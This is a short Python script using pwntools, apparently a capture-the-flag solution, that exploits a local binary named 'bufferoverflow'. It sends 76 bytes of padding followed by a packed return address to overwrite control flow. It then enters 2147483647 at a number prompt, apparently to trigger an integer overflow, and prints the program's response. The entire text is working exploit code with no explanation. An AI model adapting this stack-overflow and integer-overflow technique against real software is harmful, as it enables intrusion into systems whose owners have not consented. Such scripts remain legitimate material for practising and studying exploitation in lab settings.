from pwn import *

BINARY = "./bufferoverflow"

den=0x08049192

payload="a"*76+p32(den)

print(p32(den))

r=process(BINARY)

s=r.recvuntil("alone:")

r.sendline(payload)

r.recvuntil("number:")

r.sendline("2147483647")

r.recvuntil("number:")

r.sendline("4")

r.recvline()
s=r.recvline()
print(s)

